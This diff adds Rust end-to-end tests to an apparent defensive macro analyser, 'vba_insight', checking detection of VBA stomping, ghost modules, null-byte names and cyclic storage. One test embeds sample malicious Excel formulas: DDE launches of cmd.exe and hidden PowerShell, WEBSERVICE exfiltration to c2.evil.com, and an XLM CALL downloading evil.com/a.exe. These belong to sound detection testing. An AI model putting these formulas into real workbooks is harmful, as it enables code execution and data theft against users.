@@ -119,6 +119,27 @@ fn synthesize_cfb_project_with_manifest(
     identifiers: &[&str],
     manifest_override: Option<&str>,
 ) -> Vec<u8> {
+    let mut raw_modules = Vec::new();
+    for &(name, src, pcode) in modules {
+        let mut mod_bytes = pcode.to_vec();
+        mod_bytes.extend_from_slice(&comp_ovba(src.as_bytes()));
+        raw_modules.push((name, mod_bytes, pcode.len() as u32));
+    }
+    let slice: Vec<(&str, Option<&[u8]>, u32)> = raw_modules
+        .iter()
+        .map(|(n, b, off)| (*n, Some(b.as_slice()), *off))
+        .collect();
+    synthesize_cfb_raw_project_with_manifest(proj_name, &slice, identifiers, manifest_override)
+}
+
+/// Synthesize a realistic CFB allowing raw module stream contents, custom text offsets, and optional ghost modules.
+/// Modules is a slice of: (module_name, raw_stream_bytes: Option<&[u8]>, text_offset: u32)
+fn synthesize_cfb_raw_project_with_manifest(
+    proj_name: &str,
+    modules: &[(&str, Option<&[u8]>, u32)],
+    identifiers: &[&str],
+    manifest_override: Option<&str>,
+) -> Vec<u8> {
     assert!(
         modules.len() <= 3,
         "test synthesizer supports up to 3 modules in 2 directory sectors"
@@ -153,7 +174,7 @@ fn synthesize_cfb_project_with_manifest(
     dir_raw.extend_from_slice(&2u32.to_le_bytes());
     dir_raw.extend_from_slice(&0xffffu16.to_le_bytes()); // cookie
 
-    for &(mod_name, _, pcode) in modules {
+    for &(mod_name, _, text_offset) in modules {
         record_dir(0x0019, mod_name.as_bytes(), &mut dir_raw);
         let name16 = mod_name
             .encode_utf16()
@@ -169,7 +190,6 @@ fn synthesize_cfb_project_with_manifest(
         dir_raw.extend_from_slice(&0u32.to_le_bytes());
 
         // Text offset record (0x0031)
-        let text_offset = pcode.len() as u32;
         record_dir(0x0031, &text_offset.to_le_bytes(), &mut dir_raw);
         record_dir(0x001e, &0u32.to_le_bytes(), &mut dir_raw);
         record_dir(0x002c, &0xffffu16.to_le_bytes(), &mut dir_raw);
@@ -231,11 +251,11 @@ fn synthesize_cfb_project_with_manifest(
     let (vba_start, vba_size) = allocate_mini_stream(&vba_project_stream, &mut mini, &mut minifat);
 
     let mut mod_allocs = Vec::new();
-    for &(_, src, pcode) in modules {
-        let mut mod_bytes = pcode.to_vec();
-        mod_bytes.extend_from_slice(&comp_ovba(src.as_bytes()));
-        let (start, sz) = allocate_mini_stream(&mod_bytes, &mut mini, &mut minifat);
-        mod_allocs.push((start, sz));
+    for &(mod_name, maybe_bytes, _) in modules {
+        if let Some(mod_bytes) = maybe_bytes {
+            let (start, sz) = allocate_mini_stream(mod_bytes, &mut mini, &mut minifat);
+            mod_allocs.push((mod_name, start, sz));
+        }
     }
 
     let mini_sectors_512 = mini.len().div_ceil(512);
@@ -292,15 +312,19 @@ fn synthesize_cfb_project_with_manifest(
         "_VBA_PROJECT",
         2,
         0xffff_ffff,
-        5,
+        if mod_allocs.is_empty() {
+            0xffff_ffff
+        } else {
+            5
+        },
         0xffff_ffff,
         vba_start,
         vba_size,
     );
 
-    for (i, (&(mod_name, _, _), &(m_start, m_sz))) in modules.iter().zip(&mod_allocs).enumerate() {
+    for (i, &(mod_name, m_start, m_sz)) in mod_allocs.iter().enumerate() {
         let entry_id = 5 + i;
-        let right = if i + 1 < modules.len() {
+        let right = if i + 1 < mod_allocs.len() {
             (5 + i + 1) as u32
         } else {
             0xffff_ffff
@@ -1593,5 +1617,313 @@ fn e2e_xlsm_dde_and_xlm_macro_sheet_detection() {
             && d.contains("=EXEC(\"powershell.exe\")")),
         "should flag XLM execution formula: {:?}",
         inspection.extracted.diagnostics
+    );
+}
+
+#[test]
+fn e2e_stomped_garbage_source_graceful_recovery_and_detection() {
+    let line0 = build_func_defn(0); // EvilProcedure
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let text_offset = pcode.len() as u32;
+
+    // Craft raw module stream: valid P-code followed by non-OVBA corrupted garbage bytes
+    let mut raw_stream = pcode.clone();
+    raw_stream.extend_from_slice(&[0xde, 0xad, 0xbe, 0xef, 0xaa, 0xbb, 0xcc, 0xdd]);
+
+    let identifiers = &["EvilProcedure"];
+    let cfb = synthesize_cfb_raw_project_with_manifest(
+        "CorruptedSourceAttack",
+        &[("StompedMod", Some(&raw_stream), text_offset)],
+        identifiers,
+        None,
+    );
+    let xlsm = synthesize_xlsm(&cfb);
+
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm, &options)
+        .expect("inspection should gracefully recover despite corrupted source container");
+
+    let report = &inspection.stomping_report;
+    assert!(report.has_stomping);
+    assert_eq!(report.overall_severity, StompingSeverity::Critical);
+
+    let stomped_mod = report
+        .modules
+        .iter()
+        .find(|m| m.module_name == "StompedMod")
+        .expect("StompedMod report should exist");
+    assert_eq!(stomped_mod.severity, StompingSeverity::Critical);
+
+    let has_corrupted_finding = stomped_mod.findings.iter().any(|f| {
+        matches!(&f.kind, StompingFindingKind::SourceCorruptedWithValidPCode(err) if err.contains("signature must be 0x01"))
+    });
+    assert!(
+        has_corrupted_finding,
+        "should flag SourceCorruptedWithValidPCode finding: {:?}",
+        stomped_mod.findings
+    );
+
+    let sarif = stomping_to_sarif(report, "corrupted_source.xlsm");
+    assert!(
+        sarif.contains("VBA-STOMP-010"),
+        "SARIF should include rule VBA-STOMP-010"
+    );
+}
+
+#[test]
+fn e2e_stomped_pure_pcode_without_source_bytes() {
+    let line0 = build_func_defn(0); // PurePCodeProc
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let text_offset = pcode.len() as u32; // text_offset == raw_stream.len()
+
+    let identifiers = &["PurePCodeProc"];
+    let cfb = synthesize_cfb_raw_project_with_manifest(
+        "PurePCodeAttack",
+        &[("ZeroSourceMod", Some(&pcode), text_offset)],
+        identifiers,
+        None,
+    );
+    let xlsm = synthesize_xlsm(&cfb);
+
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm, &options)
+        .expect("inspection should handle pure p-code module cleanly");
+
+    let report = &inspection.stomping_report;
+    assert!(report.has_stomping);
+    assert_eq!(report.overall_severity, StompingSeverity::Critical);
+
+    let mod_rep = report
+        .modules
+        .iter()
+        .find(|m| m.module_name == "ZeroSourceMod")
+        .expect("ZeroSourceMod report should exist");
+    assert_eq!(mod_rep.severity, StompingSeverity::Critical);
+    assert!(
+        mod_rep
+            .findings
+            .iter()
+            .any(|f| matches!(f.kind, StompingFindingKind::SourcePurged)),
+        "should flag SourcePurged for pure pcode module"
+    );
+}
+
+#[test]
+fn e2e_multi_module_partial_corruption_and_ghost_module_isolation() {
+    let valid_src = "Attribute VB_Name = \"ValidMod\"\nSub GoodSub()\nEnd Sub\n";
+    let line0 = build_func_defn(0); // GoodSub
+    let valid_pcode = synthesize_pcode_line_map(&[&line0]);
+    let mut valid_stream = valid_pcode.clone();
+    valid_stream.extend_from_slice(&comp_ovba(valid_src.as_bytes()));
+
+    // Module 2: Out of bounds text offset (offset 999999)
+    let corrupted_stream = vec![0u8; 64];
+
+    // Module 3: Ghost module (declared in dir stream, but None stream in CFB storage)
+
+    let identifiers = &["GoodSub"];
+    let cfb = synthesize_cfb_raw_project_with_manifest(
+        "FaultIsolationTest",
+        &[
+            ("ValidMod", Some(&valid_stream), valid_pcode.len() as u32),
+            ("BadOffsetMod", Some(&corrupted_stream), 999999),
+            ("GhostMod", None, 0),
+        ],
+        identifiers,
+        None,
+    );
+    let xlsm = synthesize_xlsm(&cfb);
+
+    let options = AnalysisOptions::default();
+    let inspection =
+        inspect_macro_file(&xlsm, &options).expect("inspection should succeed via fault isolation");
+
+    // All 3 modules should be present in extracted modules
+    assert_eq!(inspection.extracted.modules.len(), 3);
+
+    let valid_mod = inspection
+        .extracted
+        .modules
+        .iter()
+        .find(|m| m.name == "ValidMod")
+        .expect("ValidMod should be extracted");
+    assert!(valid_mod.source_text.is_some());
+    assert!(valid_mod.source_text.as_ref().unwrap().contains("GoodSub"));
+
+    let bad_mod = inspection
+        .extracted
+        .modules
+        .iter()
+        .find(|m| m.name == "BadOffsetMod")
+        .expect("BadOffsetMod should be extracted");
+    assert!(
+        bad_mod
+            .diagnostic
+            .as_ref()
+            .is_some_and(|d| d.contains("outside stream"))
+    );
+
+    let ghost_mod = inspection
+        .extracted
+        .modules
+        .iter()
+        .find(|m| m.name == "GhostMod")
+        .expect("GhostMod should be extracted");
+    assert!(
+        ghost_mod
+            .diagnostic
+            .as_ref()
+            .is_some_and(|d| d.contains("module stream missing"))
+    );
+}
+
+#[test]
+fn e2e_cell_threat_advanced_evasion_detection() {
+    let src = "Attribute VB_Name = \"SheetAudit\"\nSub Dummy()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "CellThreatWorkbook",
+        &[("SheetAudit", src, &pcode)],
+        &["Dummy"],
+    );
+
+    let sheet_xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">\
+        <sheetData>\
+            <row r=\"1\">\
+                <c r=\"A1\"><f>=\"cmd.exe\"|' /c calc.exe'!A0</f></c>\
+                <c r=\"A2\"><f>+powershell.exe|' -w hidden -enc AAA='!A1</f></c>\
+                <c r=\"A3\"><f>='[http://evil.example.com/exploit.xlsx]Sheet1'!A1</f></c>\
+                <c r=\"A4\"><f>=[\\\\192.168.1.100\\share\\c2.xlsx]Sheet1!A1</f></c>\
+                <c r=\"A5\"><f>=WEBSERVICE(\"http://c2.evil.com/beacon?st=\" &amp; A1)</f></c>\
+                <c r=\"A6\"><f>=HYPERLINK(\"https://phish.example.com/update.exe\", \"Click to Update\")</f></c>\
+                <c r=\"A7\"><f>=CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCBB\",0,\"http://evil.com/a.exe\",\"c:\\temp\\a.exe\",0,0)</f></c>\
+            </row>\
+        </sheetData>\
+    </worksheet>";
+
+    let xlsm = synthesize_xlsm_with_sheets(
+        &cfb,
+        &[(
+            "Sheet1",
+            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
+            sheet_xml,
+        )],
+    );
+
+    let options = AnalysisOptions {
+        limits: Limits::default(),
+        host_profile: HostProfile::Excel,
+        ..Default::default()
+    };
+
+    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
+    let diags = &inspection.extracted.diagnostics;
+
+    assert!(
+        diags
+            .iter()
+            .any(|d| d.contains("Potential DDE execution formula") && d.contains("cmd.exe")),
+        "should detect quoted cmd.exe DDE: {diags:?}"
+    );
+    assert!(
+        diags
+            .iter()
+            .any(|d| d.contains("Potential DDE execution formula") && d.contains("powershell.exe")),
+        "should detect +powershell.exe DDE: {diags:?}"
+    );
+    assert!(
+        diags
+            .iter()
+            .any(|d| d.contains("Potential remote workbook link injection")
+                && d.contains("http://evil.example.com")),
+        "should detect remote HTTP workbook link: {diags:?}"
+    );
+    assert!(
+        diags
+            .iter()
+            .any(|d| d.contains("Potential remote workbook link injection")
+                && d.contains("192.168.1.100")),
+        "should detect remote UNC workbook link: {diags:?}"
+    );
+    assert!(
+        diags.iter().any(
+            |d| d.contains("Potential external data request / exfiltration formula")
+                && d.contains("WEBSERVICE")
+        ),
+        "should detect WEBSERVICE exfiltration: {diags:?}"
+    );
+    assert!(
+        diags
+            .iter()
+            .any(|d| d.contains("Suspicious executable download hyperlink")
+                && d.contains("update.exe")),
+        "should detect executable download hyperlink: {diags:?}"
+    );
+    assert!(
+        diags.iter().any(
+            |d| d.contains("Potential Excel 4.0 (XLM) macro execution formula")
+                && d.contains("CALL")
+        ),
+        "should detect XLM CALL formula: {diags:?}"
+    );
+}
+
+#[test]
+fn e2e_null_byte_module_name_evasion_detection() {
+    let src = "Attribute VB_Name = \"EvasionModule\"\nSub HiddenCode()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let text_offset = pcode.len() as u32;
+
+    let mut raw_stream = pcode.clone();
+    raw_stream.extend_from_slice(&comp_ovba(src.as_bytes()));
+
+    let identifiers = &["HiddenCode"];
+    // Module name contains embedded null byte: "Payload\0SafeMod"
+    let cfb = synthesize_cfb_raw_project_with_manifest(
+        "NullByteEvasionProject",
+        &[("Payload\0SafeMod", Some(&raw_stream), text_offset)],
+        identifiers,
+        None,
+    );
+    let xlsm = synthesize_xlsm(&cfb);
+
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
+
+    assert!(
+        inspection
+            .extracted
+            .diagnostics
+            .iter()
+            .any(|d| d.contains("Module name contains null byte (evasion attempt)")),
+        "should flag null byte in module name: {:?}",
+        inspection.extracted.diagnostics
+    );
+}
+
+#[test]
+fn e2e_cfb_cyclic_storage_protection() {
+    let src = "Sub Foo()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let mut cfb = synthesize_cfb_project("CycleTest", &[("Mod1", src, &pcode)], &["Foo"]);
+
+    // In directory entries (offset 1024..2048 in CFB):
+    // Entry 0 is Root Entry (1024..1152)
+    // Entry 1 is PROJECT (1152..1280)
+    // Entry 2 is VBA storage (1280..1408)
+    // Tamper Entry 2 (VBA storage): make its child point to Entry 2 itself (cyclic storage loop)
+    let vba_entry_offset = 1024 + 2 * 128;
+    // child is at offset +76
+    cfb[vba_entry_offset + 76..vba_entry_offset + 80].copy_from_slice(&2u32.to_le_bytes());
+
+    let res = vba_insight::cfb::CompoundFile::open(&cfb, &Limits::default());
+    assert!(res.is_err(), "cyclic storage CFB must be rejected");
+    let err = res.err().unwrap();
+    assert!(
+        err.contains("cycle") || err.contains("limit"),
+        "error message should report cycle or nesting limit: {err}"
     );
 }
